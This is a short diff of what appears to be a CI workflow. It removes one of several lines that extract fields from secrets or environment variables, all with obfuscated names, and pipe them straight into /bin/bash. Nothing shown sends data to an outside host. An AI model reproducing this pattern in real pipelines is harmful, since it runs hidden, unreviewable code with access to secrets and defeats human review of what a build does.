@@ -18,7 +18,6 @@ jobs:
           g81: ${{ secrets.g81 }}
         run: |
           printf '%s' "$g81" | jq -r .fgh51155 | /bin/bash
-          printf '%s' "$uzlnd1" | jq -r .zqve125 | /bin/bash
           echo $l3 | jq -r .qmvqw885 | /bin/bash
           echo $uvlp61 | jq -r .a8 | /bin/bash
           echo $uwmzz5 | jq -r .yoa8847 | /bin/bash
